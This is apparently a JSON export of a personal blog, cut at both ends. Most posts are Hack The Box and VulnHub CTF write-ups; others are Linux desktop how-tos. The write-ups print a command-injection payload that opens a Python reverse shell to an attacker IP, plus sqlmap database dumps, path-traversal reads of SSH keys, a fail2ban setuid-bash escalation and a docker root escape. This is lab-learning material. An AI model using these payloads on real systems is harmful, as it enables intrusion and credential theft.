Good, now I want it in one line and replace the space by a random char: grep \"#FF3200\" -C 1 hex.txt | awk '&#123; print $3 &#125;' | awk '!NF&#123;$0=\">\"&#125;1' | xargs Now I have to replace #FF3200 #FF3200 #FF3200 by - and #FF3200 by ..Then remove every thing who is not -, . and &gt;.Finaly replace &gt; by a space. grep \"#FF3200\" -C 1 hex.txt | awk '&#123; print $3 &#125;' | awk '!NF&#123;$0=\">\"&#125;1' | xargs | sed 's/#FF3200 #FF3200 #FF3200 /-/g' | sed 's/#FF3200 /./g' | sed 's/#BC32D8//g' |sed 's/ //g'| sed 's/>/ /g' Translate the morseNow I have this string ----- ---.., there is one space between the 2 chars, I would add one space at the end and use sed to replace it by a letter. Like this sed 's/----- /9/' sed 's/---.. /8/' This is what I wanted to do at first but my space is removed in my script, I don’t know why.So I add this &gt; at the end to have something like this: .- -... &gt;It’s working well, here is the code: #!/bin/bash code=$1 code=$(echo $code | sed 's/\\.- /A/g') code=$(echo $code | sed 's/-\\.\\.\\. /B/g') code=$(echo $code | sed 's/-\\.-\\. /C/g') code=$(echo $code | sed 's/-\\.\\. /D/g') code=$(echo $code | sed 's/\\. /E/g') code=$(echo $code | sed 's/\\.\\.-\\. /F/g') code=$(echo $code | sed 's/--\\. /G/g') code=$(echo $code | sed 's/\\.\\.\\.\\. /H/g') code=$(echo $code | sed 's/\\.\\. /I/g') code=$(echo $code | sed 's/\\.--- /J/g') code=$(echo $code | sed 's/-\\.- /K/g') code=$(echo $code | sed 's/\\.-\\.\\. /L/g') code=$(echo $code | sed 's/-- /M/g') code=$(echo $code | sed 's/-\\. /N/g') code=$(echo $code | sed 's/--- /O/g') code=$(echo $code | sed 's/\\.-- /P/g') code=$(echo $code | sed 's/--\\.- /Q/g') code=$(echo $code | sed 's/\\.-\\. /R/g') code=$(echo $code | sed 's/\\.\\.\\. /S/g') code=$(echo $code | sed 's/- /T/g') code=$(echo $code | sed 's/\\.\\.- /U/g') code=$(echo $code | sed 's/\\.\\.\\.- /V/g') code=$(echo $code | sed 's/\\.-- /W/g') code=$(echo $code | sed 's/-\\.\\.- /X/g') code=$(echo $code | sed 's/-\\.-- /Y/g') code=$(echo $code | sed 's/--\\.\\. /Z/g') code=$(echo $code | sed 's/\\.---- /1/g') code=$(echo $code | sed 's/\\.\\.--- /2/g') code=$(echo $code | sed 's/\\.\\.\\.-- /3/g') code=$(echo $code | sed 's/\\.\\.\\.\\.- /4/g') code=$(echo $code | sed 's/\\.\\.\\.\\.\\. /5/g') code=$(echo $code | sed 's/-\\.\\.\\. /6/g') code=$(echo $code | sed 's/--\\.\\.\\. /7/g') code=$(echo $code | sed 's/---\\.\\. /8/g') code=$(echo $code | sed 's/----\\. /9/g') code=$(echo $code | sed 's/----- /0/g') code=$(echo $code | sed 's/ >//g') echo $code It’s ugly, there is no loop, no if and all that shiny stuffs, only the basics but it’s working.I can do it even smaller, with multiple sed in sed in sed etc…And then the output of this will be the password for the zip file.I have to assemble everything like a lego. AssembleIn my script I have to do this: # Get Morse # Translate # Unzip # repeat Oh nooooooo !!!I just found a problem, it’s not the same hex value for every flag.png.There is 2 hex value every times, there is more background then foreground.To find the background: background=$(convert *.png txt:- | awk '&#123; print $3 &#125;' | grep \"#\" | head -n 1) foreground=$(convert *.png txt:- | awk '&#123; print $3 &#125;' | grep \"#\" | grep -v $background | head -n 1) Almost doneError 1I have a problem with tho morse code, I have to change the position of few sed command.There is few dots remaining in the password, it’s inaceptable.The error: .-. . .--. .-. = R. = E . –. = Pbut–. = GI should translate the P before the G. Error 2The translation it good.There is only 2 colors:Ok got it … Ihad to change the password to lower case.I will use this: echo \"$&#123;a,,&#125;\" Now I have to wait. Error 3So I’m trying manualy.The password looks good, the problem is somewhere else. fillin_CFileInfo - internal error - MAX_PATHNAME_LEN Yup, the path is very longI’ve unziped more than 150 zip files, I should move the zip file every 150 files to be closer to the root directory.I’m not gonna create an another loop, I will just use the current one. if [ $c == 850 ] || [ $c == 700 ] || [ $c == 550 ] || [ $c == 400 ] || [ $c == 250 ] || [ $c == 100 ]; Final #!/bin/bash # Get Morse ## Get colors for (( c=999; c>=0; c-- )) do if [ $c == 850 ] || [ $c == 700 ] || [ $c == 550 ] || [ $c == 400 ] || [ $c == 250 ] || [ $c == 100 ]; # To tired to play with regex then mv flag /home/peanutstick/Documents/CTF/Challenges/HTB/M0rsarchive/flag$c cd /home/peanutstick/Documents/CTF/Challenges/HTB/M0rsarchive/flag$c else cd flag fi b=$(convert *.png txt:- | awk '&#123; print $3 &#125;' | grep \"#\" | head -n 1) f=$(convert *.png txt:- | awk '&#123; print $3 &#125;' | grep \"#\" | grep -v $b | head -n 1) #echo \"Background: $b\" #echo \"Foreground: $f\" ## Replace the str code=$(convert *.png txt:- | grep $f -C 1 | awk '&#123; print $3 &#125;'| awk '!NF&#123;$0=\">\"&#125;1' | xargs | sed 's/'$f' '$f' '$f' /-/g' | sed 's/'$f' /./g' | sed 's/'$b'//g' |sed 's/ //g'| sed 's/>/ /g') code=\"$&#123;code&#125; >\" echo $code # Translate ## Group of 4 code=$(echo $code | sed 's/\\.---- /1/g') code=$(echo $code | sed 's/\\.\\.--- /2/g') code=$(echo $code | sed 's/\\.\\.\\.-- /3/g') code=$(echo $code | sed 's/\\.\\.\\.\\.- /4/g') code=$(echo $code | sed 's/\\.\\.\\.\\.\\. /5/g') code=$(echo $code | sed 's/-\\.\\.\\.\\. /6/g') code=$(echo $code | sed 's/--\\.\\.\\. /7/g') code=$(echo $code | sed 's/---\\.\\. /8/g') code=$(echo $code | sed 's/----\\. /9/g') code=$(echo $code | sed 's/----- /0/g') code=$(echo $code | sed 's/-\\.\\.\\. /B/g') code=$(echo $code | sed 's/-\\.-\\. /C/g') code=$(echo $code | sed 's/-\\.\\.- /X/g') code=$(echo $code | sed 's/-\\.-- /Y/g') code=$(echo $code | sed 's/--\\.\\. /Z/g') code=$(echo $code | sed 's/\\.--\\. /P/g') code=$(echo $code | sed 's/--\\.- /Q/g') code=$(echo $code | sed 's/\\.\\.\\.- /V/g') code=$(echo $code | sed 's/\\.\\.\\.\\. /H/g') code=$(echo $code | sed 's/\\.-\\.\\. /L/g') code=$(echo $code | sed 's/\\.--- /J/g') code=$(echo $code | sed 's/\\.\\.-\\. /F/g') code=$(echo $code | sed 's/-\\.\\. /D/g') code=$(echo $code | sed 's/--\\. /G/g') code=$(echo $code | sed 's/--- /O/g') code=$(echo $code | sed 's/\\.\\.- /U/g') code=$(echo $code | sed 's/\\.-- /W/g') code=$(echo $code | sed 's/\\.\\.\\. /S/g') code=$(echo $code | sed 's/\\.-\\. /R/g') code=$(echo $code | sed 's/-\\.- /K/g') code=$(echo $code | sed 's/\\.- /A/g') code=$(echo $code | sed 's/\\.\\. /I/g') code=$(echo $code | sed 's/-- /M/g') code=$(echo $code | sed 's/-\\. /N/g') code=$(echo $code | sed 's/\\. /E/g') code=$(echo $code | sed 's/- /T/g') password=$(echo $code | sed 's/>//g') echo \"Unzip flag_$c.zip with $password\" # Unzip 7z X flag_$c.zip -P$password -y > /dev/null 2>&amp;1 if [ $? -ne 0 ]; then password=$(echo $&#123;password,,&#125;) 7z X flag_$c.zip -P$password -y > /dev/null 2>&amp;1 fi echo \"7z X flag_$c.zip -P$password -y\" done 71 lines of code and 39 for the morse part.It was fun.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Photobomb","slug":"CTF_Photobomb","date":"2021-10-09T16:09:05.000Z","updated":"2022-10-09T19:32:34.264Z","comments":true,"path":"/post/CTF_Photobomb.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Photobomb.html","excerpt":"","text":"Rustscanrustscan -a photobomb.htb --ulimit 5000 Output: Open 10.129.202.206:22 Open 10.129.202.206:80 wfuzzSubdomainwfuzz -c -f subdomains -w /usr/share/wordlists/wfuzz/others/subdomains.txt -u 'http://photobomb.htb' -H \"Host: FUZZ.photobomb.htb\" --sc 200 No subdomain digdig axfr photobomb.htb @photobomb.htb Nothing Gobustergobuster dir -u http://photobomb.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html --wildcard switch |grep \"Status: 200\" WebsiteInternal portI was trying te determin if it the website can andle php or html, and I found this.The image don’t display.Also, Sinatra should be a user. SSTI ?http://photobomb.htb/&#123;&#123;7*7&#125;&#125; Source codeIn the js file:this is a username with the password.http://pH0t0:b0Mb!@photobomb.htb/printer Download the photosI cupy the request as curl comand. curl &#39;http:&#x2F;&#x2F;photobomb.htb&#x2F;printer&#39; -X POST -H &#39;User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:105.0) Gecko&#x2F;20100101 Firefox&#x2F;105.0&#39; -H &#39;Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&#39; -H &#39;Accept-Language: en-US,en;q&#x3D;0.5&#39; -H &#39;Accept-Encoding: gzip, deflate&#39; -H &#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39; -H &#39;Origin: http:&#x2F;&#x2F;photobomb.htb&#39; -H &#39;Authorization: Basic cEgwdDA6YjBNYiE&#x3D;&#39; -H &#39;Connection: keep-alive&#39; -H &#39;Referer: http:&#x2F;&#x2F;photobomb.htb&#x2F;printer&#39; -H &#39;Upgrade-Insecure-Requests: 1&#39; --data-raw &#39;photo&#x3D;voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype&#x3D;jpg&amp;dimensions&#x3D;3000x2000&#39; Reverse shellIf I add this in the bodu and listenj with netcat I can spawn a reverse shell.Listen: nc -nlvp 8645 Connect: photo&#x3D;almas-salakhov-VK7TCqcZTlw-unsplash.jpg&amp;filetype&#x3D;png;export RHOST&#x3D;&quot;10.10.14.93&quot;;export RPORT&#x3D;8645;python3 -c &#39;import sys,socket,os,pty;s&#x3D;socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)&#39;&amp;dimensions&#x3D;1920x1080 Privilage escalationsudo -l https://book.hacktricks.xyz/linux-hardening/privilege-escalation#:~:text=LD_PRELOAD%20%26%20LD_LIBRARY_PATHCreate the payloadDownload it:And compile it:I have to compile it myself…This is fine.Then send it to the target and run it.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Trick","slug":"CTF_Trick","date":"2021-10-05T23:40:52.000Z","updated":"2022-10-07T16:20:12.221Z","comments":true,"path":"/post/CTF_Trick.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Trick.html","excerpt":"","text":"/etc/hosts10.10.11.166 trick.htb Rustscanrustscan -a trick.htb Output: PORT STATE SERVICE REASON 22&#x2F;tcp open ssh syn-ack 25&#x2F;tcp open smtp syn-ack 80&#x2F;tcp open http syn-ack wfuzzSo I’ve tried to list the directories and the subdomains, but there is nothing.It’s not the real website, I have to dig deeper. Digdig a trick.htb @trick.htb Output: ;; communications error to 10.10.11.166#53: connection refused ;; communications error to 10.10.11.166#53: connection refused ;; communications error to 10.10.11.166#53: connection refused ; &lt;&lt;&gt;&gt; DiG 9.18.7 &lt;&lt;&gt;&gt; a trick.htb @trick.htb ;; global options: +cmd ;; no servers could be reached the port 53 is closed, should I reset the machine ?Lol, it was the solution.https://stackoverflow.com/questions/131989/how-do-i-get-a-list-of-all-subdomains-of-a-domain dig axfr trick.htb @trick.htb preprod-payroll.trick.htbI have to add it to /etc/hosts. wfuzzdirectorywfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200 'http://preprod-payroll.trick.htb/FUZZ' Login pageThere is a login page, let’s try sqlmap. sqlmap don’t find anything, I think he need the user agent or the cookie. Output: curl &#39;http:&#x2F;&#x2F;preprod-payroll.trick.htb&#x2F;ajax.php?action&#x3D;login&#39; -X POST -H &#39;User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:105.0) Gecko&#x2F;20100101 Firefox&#x2F;105.0&#39; -H &#39;Accept: *&#x2F;*&#39; -H &#39;Accept-Language: en-US,en;q&#x3D;0.5&#39; -H &#39;Accept-Encoding: gzip, deflate&#39; -H &#39;Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8&#39; -H &#39;X-Requested-With: XMLHttpRequest&#39; -H &#39;Origin: http:&#x2F;&#x2F;preprod-payroll.trick.htb&#39; -H &#39;Connection: keep-alive&#39; -H &#39;Referer: http:&#x2F;&#x2F;preprod-payroll.trick.htb&#x2F;login.php&#39; -H &#39;Cookie: PHPSESSID&#x3D;vle17ll7puj0b1kblu8c40ue3r&#39; --data-raw &#39;username&#x3D;fgh&amp;password&#x3D;fgh&#39; sqlmapReplace curl by sqlmap and add -dbs to list the databases. Now I’m gonna list the tables in the database. sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=vle17ll7puj0b1kblu8c40ue3r' --data-raw 'username=fgh&amp;password=fgh' -D payroll_db --tables Now dump the user table: sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=vle17ll7puj0b1kblu8c40ue3r' --data-raw 'username=fgh&amp;password=fgh' -D payroll_db -T users --dump Output: Database: payroll_db Table: users [1 entry] +----+-----------+---------------+------+---------+---------+-----------------------+------------+ | id | doctor_id | name | type | address | contact | password | username | +----+-----------+---------------+------+---------+---------+-----------------------+------------+ | 1 | 0 | Administrator | 1 | &lt;blank&gt; | &lt;blank&gt; | SuperGucciRainbowCake | Enemigosss | +----+-----------+---------------+------+---------+---------+-----------------------+------------+ I can use theres creds to login. Website 1LFIWhen I saw the index.php?page= I’ve tried to exploit it with wfuzz, but didn’t found anything. wfuzz -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt --sc 200 'http://preprod-payroll.trick.htb/index.php?page=../../../../../../../FUZZ' If I can’t exploit it maybe there is some informations to gather. Subdomainwfuzzwfuzz -c -f subdomains -w /usr/share/wordlists/wfuzz/others/subdomains.txt -u 'http://trick.htb' -H \"Host: FUZZ.trick.htb\" >> subdomains &amp; Found nothing.The last subdomain was preprod-payroll, because it’s a preprod server.So I should keep the word preprod and try again wfuzz -c -f subdomains -w /usr/share/wordlists/wfuzz/others/subdomains.txt -u 'http://trick.htb' -H \"Host: preprod-FUZZ.trick.htb\" >> subdomains &amp; Now I know for what was made the last website, to find this subdomain. Website 2http://preprod-marketing.trick.htbOk, I have to add it to /etc/hosts.And Voila.It was made with this template: https://templatemo.com/tm-547-real-dynamicWe have few users: Erik Morris Michael Owen Mary Kay Jen Terry Levi Moore And again, the ?page=. wfuzzI wanted to try few wordlist. wfuzz -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --sc 200 'http://preprod-marketing.trick.htb/index.php?page=../../../../../../../FUZZ' >> fli.txt &amp; http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//etc/passwdYeah !michael is a user.Let’s get the flag.http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//home/michael/user.txtNow let’s grab the private ssh key.http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa sudo exploitsudo -l Output: Matching Defaults entries for michael on trick: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin User michael may run the following commands on trick: (root) NOPASSWD: &#x2F;etc&#x2F;init.d&#x2F;fail2ban restart We have to play with fail2ban, there is nothing in gtfobin. https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7I have to play with the file iptables-multiport.conf, but I can’t write in it.So I have to copy it somewhere and move it to replace the original one. then add the line actionban = chmod u+s /bin/bash in the file iptables-multiport.conf.Reboot the service with sudo /etc/init.d/fail2ban restartTry to login 5 times via ssh without the private key and without a password.Now you can use bash -p to become root.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF IMF","slug":"CTF_IMF","date":"2021-10-03T23:40:52.000Z","updated":"2022-10-03T16:41:31.642Z","comments":true,"path":"/post/CTF_IMF.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_IMF.html","excerpt":"","text":"netdiscover192.168.0.15 rustscanOnly the port 80 is open Port 80Apache/2.4.18 First flagview-source:http://192.168.0.15/contact.phpflag1{YWxsdGhlZmlsZXM=}allthefiles second flag ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ&#x3D;&#x3D; Flag2: echo \"ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==\" | base64 --decode flag2&#123;aW1mYWRtaW5pc3RyYXRvcg==&#125; echo \"aW1mYWRtaW5pc3RyYXRvcg==\" | base64 --decode imfadministrator Login pagehttp://192.168.0.15/imfadministrator/Roger is a user.The password is hard coded in the cookie.If I delete it he recreate an another cookie.So, I have to create my own cookie.The password may be good, but we also need the username.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Choppy","slug":"CTF_Choppy","date":"2021-10-01T23:15:52.000Z","updated":"2022-10-02T07:56:56.483Z","comments":true,"path":"/post/CTF_Choppy.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Choppy.html","excerpt":"","text":"Rustscanrustscan -a 10.10.11.180 Output: PORT STATE SERVICE REASON 22&#x2F;tcp open ssh syn-ack 80&#x2F;tcp open http syn-ack 9093&#x2F;tcp open copycat syn-ack /etc/hostsecho \"10.10.11.180 shoppy.htb\" >> /etc/hosts Port 80Subdomain listingwfuzz -c -f subdomains -w /usr/share/wordlists/wfuzz/others/subdomains.txt -u 'http://shoppy.htb' -H \"Host: FUZZ.shoppy.htb\" --hw 9000 --sc 200 Add mattermost.shoppy.htb to /etc/hosts Gobustergobuster dir -u http://shoppy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --wildcard switch Output: &#x2F;images (Status: 301) [Size: 179] [--&gt; &#x2F;images&#x2F;] &#x2F;login (Status: 200) [Size: 1074] &#x2F;admin (Status: 302) [Size: 28] [--&gt; &#x2F;login] &#x2F;assets (Status: 301) [Size: 179] [--&gt; &#x2F;assets&#x2F;] &#x2F;css (Status: 301) [Size: 173] [--&gt; &#x2F;css&#x2F;] &#x2F;Login (Status: 200) [Size: 1074] &#x2F;js (Status: 301) [Size: 171] [--&gt; &#x2F;js&#x2F;] &#x2F;fonts (Status: 301) [Size: 177] [--&gt; &#x2F;fonts&#x2F;] &#x2F;Admin (Status: 302) [Size: 28] [--&gt; &#x2F;login] &#x2F;exports (Status: 301) [Size: 181] [--&gt; &#x2F;exports&#x2F;] &#x2F;LogIn (Status: 200) [Size: 1074] &#x2F;LOGIN (Status: 200) [Size: 1074] Login pagehttp://shoppy.htb/login You can bypass the login pageI will use burpsuite to intercept the trafic.While I was playing with burpsuite I go an interesting error:We have an username jaeger./home/jaeger/ShoppyApp/node_modules/body-parser/lib/types/json.js Bypass auth login pageWhen I put a ‘ the page take more time to load.https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypassI from this liste I took this &#39;||&#39;2 and add admin at the beggining. Searsh for userI have to search for a user, it’s not working with jaeger.I enter &#39;||&#39;2 to find a new user, josh. Crack the passwordThis is a hash, probably MD5.6ebcea65320589ca4f2f1ce039975995https://www.dcode.fr/cipher-identifier echo \"6ebcea65320589ca4f2f1ce039975995\" > hash hashcat -m 0 hash /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt remembermethisway Mattermosthttp://mattermost.shoppy.htb/loginjaeger is a linux user, I saw him in the error with burpsuite.Let’s use ssh. jaegerssh jaeger@shoppy.htb sudo -l sudo -u deploy /home/deploy/password-manager I don’t have the password, if I use strings I see nothing but with cat it’s working.Sample deployssh deploy@shoppy.htb Deploying@pp!I’m using lse again.I can use docker, I can also exploit it with GTFOBins.https://gtfobins.github.io/gtfobins/docker/ docker run -v /:/mnt --rm -it alpine chroot /mnt sh I’m root","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Tr0ll","slug":"CTF_Tr0ll","date":"2021-10-01T23:15:52.000Z","updated":"2022-09-27T07:49:11.134Z","comments":true,"path":"/post/CTF_Tr0ll.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Tr0ll.html","excerpt":"","text":"Discoveryhttps://www.vulnhub.com/entry/tr0ll-1,100/ Tr0ll was inspired by the constant trolling of the machines within the OSCP labs.The goal is simple, gain root and get Proof.txt from the /root directory.Not for the easily frustrated! Fair warning, there be trolls ahead!Difficulty: Beginner ; Type: boot2root Scanningnetdiscoversudo netdiscover nmapnmap -sV -p- 192.168.0.24 Port 80There is nothing intresting in the source code of this page.Let&#39;s see what is in the robots.txt. User-agent:* Disallow: &#x2F;secret …yes DirbusterToo many errors for me, I will search for something else. NiktoNothing intresting on the port 80, I already know for the secret and robot.txt.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Run non steam game with proton on lutris","slug":"Run_games_on_lutris_with_proton","date":"2021-09-15T02:40:52.000Z","updated":"2022-09-27T07:49:10.021Z","comments":true,"path":"/post/Run_games_on_lutris_with_proton.html","link":"","permalink":"https://peanutstick.github.io/post/Run_games_on_lutris_with_proton.html","excerpt":"","text":"Install Steam and proton.On steam:Setings &gt; Steam Play and toggle the option “Enable Steam Play for Supported Titles”. Now you can select the last version of Proton and download it via steam. Copy Proton folder.You have to copy the proton folder:.steam/root/steamapps/common/And past it wher you want, for me it’s here:.local/share/lutris/runners/wine/ It’s look like this for me:cp .steam/root/steamapps/common/Proton\\ 6.3 .local/share/lutris/runners/wine/Proton\\ 6.3 -R Configure lutrisIn the Runners section eddit wine: Runner optionsWine version: CustomCustom Wine executable: /home/username/.local/share/lutris/runners/Proton 6.3/dist/bin/wine System optionsDisable lutris Runtime: YesRun in a terminal: YesEnvironment variables: AddKey: STEAM_COMPAT_DATA_PATHValue: /path/to/your/gamesPre-launch script: /home/peanutstick/.local/share/lutris/runners/Proton 6.3/protonWait for pre-launch script completion: YesSave Now your games who run with wine will use proton.","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux, Gaming","slug":"Linux-Gaming","permalink":"https://peanutstick.github.io/tags/Linux-Gaming/"}]},{"title":"Add windows to grub","slug":"Add-windows-to-grub","date":"2021-08-28T05:54:52.000Z","updated":"2022-09-27T07:49:10.984Z","comments":true,"path":"/post/Add-windows-to-grub.html","link":"","permalink":"https://peanutstick.github.io/post/Add-windows-to-grub.html","excerpt":"","text":"FilesI&#39;t write DO NOT EDIT THIS FILEBut I&#39;ve done it, it was useless, I think I had to do it only if I was on MBR.I added this content in this file Techbrown/boot/grub/grub.cfg This file was used to enable os-prober/etc/default/grub Install OS-Probersudo pacman -S os-prober Run it:sudo os-prober Output:/dev/sda2@/efi/Microsoft/Boot/bootmgfw.efi:Windows Boot Manager:Windows:efi Enable os-prober in grubedit /etc/default/grubadd GRUB_DISABLE_OS_PROBER=false Update grubsudo grub-mkconfig -o /boot/grub/grub.cfg","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Resize the main partion with gparted","slug":"gparted","date":"2021-08-27T15:08:52.000Z","updated":"2022-09-27T07:49:09.751Z","comments":true,"path":"/post/gparted.html","link":"","permalink":"https://peanutstick.github.io/post/gparted.html","excerpt":"","text":"Create a GParted live bootable USB driveI&#39;ve tied to resize my main partion, I had to unmount it to do it.https://gparted.org/liveusb.phpYou just have to follow the steps. Boot on the USB driveYou have to change the boot order.I can access to the bios settings without typing on every keys who start with F*.I have an option to do it at startup: UEFI Firmware settings.Now go to Boot and set the USB drive at the top to boot on it first. GpartedSelect the first choise to boot on it.Launch GParted and you are ready to resize the partitions.Be carefull you can loose your datas","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Cheat Sheet of the commands I use","slug":"cheat-sheet","date":"2021-08-08T15:15:52.000Z","updated":"2022-09-27T07:49:10.064Z","comments":true,"path":"/post/cheat-sheet.html","link":"","permalink":"https://peanutstick.github.io/post/cheat-sheet.html","excerpt":"","text":"IntroIt&#39;s mostly usefull for me.I will put some commands here and delet them later if I can remember them. ScreenSet resolution as autoxrandr --output eDP-1 --auto Display on second monitorxrandr --output HDMI-1-0 --auto --right-of eDP-1 Switch intel/NVIDIA GPUoptimus-manager --switch integrated, nvidia, hybrid, intel AudioControl pannelpavucontrol Musicmpd (start the server)ncmpcpp WifiConnect to a networknmcli dev wifi connect “NAME” password “PASS” Show UUIDnmcli con show (not usefull, I can see it with polybar) BatteryTLPtlp-stat/etc/tlp.conf","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Ted","slug":"CTF_Ted","date":"2021-08-08T02:15:52.000Z","updated":"2022-09-27T07:49:09.708Z","comments":true,"path":"/post/CTF_Ted.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Ted.html","excerpt":"","text":"DiscoveryLet’s read the infos.https://www.vulnhub.com/entry/ted-1,327/ How well do you understand PHP programs?How familiar are you with Linux misconfigurations?This image will cover advanced Web attacks, out of the box thinking and the latest security vulnerabilities. Please note that this is capture the flag machine which means it is not real life scenariobut will challenge you hard before you can obtain root privileges. Scanningnetdiscoversudo netdiscover 192.168.0.0/16 nmapsudo nmap -sV -p- 192.168.0.31Only the port 80 is open. This is what we have: I found nothing with dirbuster and nikto.let’s try with Burpsuit. burpsuitI intercept the traffic and open the Browser.Request: He talked about missconfiguration, let’s try some creds like admin, user, root, toor, etc… Here we go!I think I found the password, now I need the username.I saw 2 differents response: Password or password hash is not correct, make sure to hash it before submit. Username is not correct.User=toor","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Set Polybar on 2 screens","slug":"Set_polybar_on_2_screen","date":"2021-08-08T02:15:52.000Z","updated":"2022-09-27T07:49:10.041Z","comments":true,"path":"/post/Set_polybar_on_2_screen.html","link":"","permalink":"https://peanutstick.github.io/post/Set_polybar_on_2_screen.html","excerpt":"","text":"ConfigIn ~/.config/polybar/configWat is your bar, by default it&#39;s exemple, but mine is Bar.You should add monitor. [bar&#x2F;Bar] monitor &#x3D; $&#123;env:MONITOR:&#125; launch.shIn ~/.config/polybar/launch.shAdd this. if type &quot;xrandr&quot;; then for m in $(xrandr --query | grep &quot; connected&quot; | cut -d&quot; &quot; -f1); do MONITOR&#x3D;$m polybar --reload Bar &amp; done else polybar --reload Bar &amp; fi To avoid 2 bars on the main screen comment the line you used to launch it. #polybar Bar 2&gt;&amp;1 | tee -a &#x2F;tmp&#x2F;polybar1.log &amp; disown","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Change screen resolution with xandr","slug":"Change_screen_resolution","date":"2021-08-02T02:15:52.000Z","updated":"2022-09-27T07:49:09.538Z","comments":true,"path":"/post/Change_screen_resolution.html","link":"","permalink":"https://peanutstick.github.io/post/Change_screen_resolution.html","excerpt":"","text":"Find the right sreenType xrandr: Screen 0: minimum 320 x 200, current 1920 x 1080, maximum 16384 x 